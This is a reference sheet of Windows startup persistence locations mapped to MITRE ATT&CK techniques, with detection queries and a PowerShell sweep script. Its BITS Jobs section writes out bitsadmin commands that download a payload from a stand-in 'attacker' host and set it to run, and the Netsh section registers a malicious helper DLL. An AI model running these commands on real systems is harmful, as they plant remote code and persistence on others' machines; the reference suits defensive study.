# Windows Startup Persistence Locations

Complete reference of all locations where persistence can be established on Windows.

**MITRE ATT&CK**: T1547, T1053, T1546

## Registry Run Keys (T1547.001)

```
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
```

## Winlogon (T1547.004)

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify
```

## Image File Execution Options (T1546.012)

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<exe>\Debugger
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\<exe>\MonitorProcess
```

## AppInit_DLLs (T1546.010)

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
```

## Startup Folders (T1547.001)

```
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\     (current user)
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\ (all users)
```

## Services (T1543.003)

```
HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>\ImagePath
HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>\Parameters\ServiceDll
```

## Scheduled Tasks (T1053.005)

```
C:\Windows\System32\Tasks\
C:\Windows\SysWOW64\Tasks\
schtasks /Query /V /FO LIST
```

## WMI Event Subscriptions (T1546.003)

```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
Get-WmiObject -Namespace root\subscription -Class ActiveScriptEventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

## COM Hijacking (T1546.015)

```
HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32    (user-level override)
HKCU\Software\Classes\CLSID\{CLSID}\LocalServer32
HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32    (system-level)
HKLM\Software\Classes\CLSID\{CLSID}\TreatAs
```

## Group Policy Scripts

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Shutdown
%SystemRoot%\System32\GroupPolicy\Machine\Scripts\Startup\
%SystemRoot%\System32\GroupPolicy\User\Scripts\Logon\
```

## BITS Jobs (T1197)

```cmd
bitsadmin /create persistence_job
bitsadmin /addfile persistence_job http://attacker/payload.exe C:\temp\payload.exe
bitsadmin /SetNotifyCmdLine persistence_job C:\temp\payload.exe ""
bitsadmin /SetMinRetryDelay persistence_job 300
bitsadmin /resume persistence_job
```

```powershell
# Detection
Get-BitsTransfer -AllUsers | Format-List *
```

## Office Add-ins

```
HKCU\Software\Microsoft\Office\<version>\<app>\Security\Trusted Locations
HKCU\Software\Microsoft\Office\<version>\Word\Options\STARTUP-PATH
%APPDATA%\Microsoft\Word\STARTUP\     (Word template auto-load)
%APPDATA%\Microsoft\Excel\XLSTART\    (Excel add-in auto-load)
%APPDATA%\Microsoft\Outlook\          (Outlook VBA, rules)
```

## Browser Extensions

```
Chrome:  %LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\
Firefox: %APPDATA%\Mozilla\Firefox\Profiles\*.default\extensions\
Edge:    %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Extensions\
Registry: HKLM\SOFTWARE\Google\Chrome\Extensions\
```

## ScreenSaver

```
HKCU\Control Panel\Desktop\SCRNSAVE.EXE
HKCU\Control Panel\Desktop\ScreenSaveActive
HKCU\Control Panel\Desktop\ScreenSaveTimeOut
```

## Print Monitor (T1547.010)

```
HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\<name>\Driver
```

## Netsh Helper DLL (T1546.007)

```cmd
netsh add helper C:\path\to\malicious.dll
:: Loads every time netsh.exe runs
```

```
HKLM\SOFTWARE\Microsoft\NetSh
```

## Detection Script

```powershell
# Quick sweep of common persistence locations
$locations = @(
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
)
foreach ($loc in $locations) {
    Write-Output "`n=== $loc ==="
    Get-ItemProperty $loc -ErrorAction SilentlyContinue | Format-List
}

# Autoruns (Sysinternals) — most comprehensive
autorunsc.exe -accepteula -a * -c -h -s -v -vt | Out-File autoruns.csv
```
